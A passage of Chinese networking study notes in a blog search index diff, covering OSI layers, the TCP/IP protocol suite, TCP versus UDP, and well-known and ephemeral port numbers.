+<li>会话层: 建立端连接并提供访问验证和会话管理(SESSION)</li>
+<li>传输层: 提供应用进程自己的逻辑通信。</li>
+<li>网络层: 为数据在节点之间传输创建逻辑链路，并分组转发数据、</li>
+<li>数据链路层: 在通信的实体间建立数据链路连接。</li>
+<li>物理层: 为数据端设备提供原始比特流动的传输的通道。</li>
+</ul>
+<h2 id="TCP-IP简介"><a href="#TCP-IP简介" class="headerlink" title="TCP/IP简介"></a>TCP/IP简介</h2><p>定义: <code>TCP/IP</code>是一个网络通信模型，是整个网络传输协议家族，为互联网的基础通信架构。它常被统称为<code>TCP/IP</code>协议族，简称<code>TCP/IP</code>。</p>
+<p>该协议族中两个核心协议:<code>TCP</code>(传输控制协议)和<code>IP</code>(网际协议)。</p>
+<p><code>TCP/IP</code>协议族按层次分别分为：</p>
+<ul>
+<li><p>应用层(应用、表示、会话): 在应用层包含了不同类型的应用进程。涉及到的协议:</p>
+<p>文件传输: <code>TFTP</code>(69)、<code>FTP</code>(21)、<code>NFS</code>；</p>
+<p>E-Mail: <code>SMTP</code>(25端口)；</p>
+<p>远程登录:  <code>Telnet</code>(23)、<code>rlogin</code>；</p>
+<p>网络管理: <code>SNMP</code>(161)；</p>
+<p>域名服务: <code>DNS</code>(53)。</p>
+</li>
+<li><p>传输层(传输): 主要为两台主机上的应用程序提供端到端的通信服务。涉及到的协议:</p>
+<p>传输协议: <code>TCP</code>(传输控制协议)和<code>UDP</code>(用户数据报协议)。</p>
+<p><code>TCP</code>: 面向连接的传协议，具有可靠性，传输速度慢，开销大。</p>
+<p><code>UDP</code>: 面向数据报的传协议，不具有可靠性，传输速度快，开销小。</p>
+</li>
+<li><p>网络层(网络):涉及协议:</p>
+<p><code>IP</code>协议: 无连接，不可靠，数据包分段和重组，路由功能。</p>
+<p><code>ICMP</code>协议: 常用的工具<code>ping</code>和<code>traceroute</code>使用的协议。</p>
+<p><code>ARP</code>(地址解析协议)和<code>RARP</code>(反地址解析协议)协议。</p>
+</li>
+<li><p>数据链路层(数据链路、物理)。</p>
+</li>
+</ul>
+<p>端口号:</p>
+<p>服务器一般通过知名端口号来识别应用程序，范围1-1023。</p>
+<p>客户端口号，又称临时端口号，范围一般为1024-5000，大于5000的端口为其他服务器预留。</p>
 ]]></content>
   </entry>
 </search>
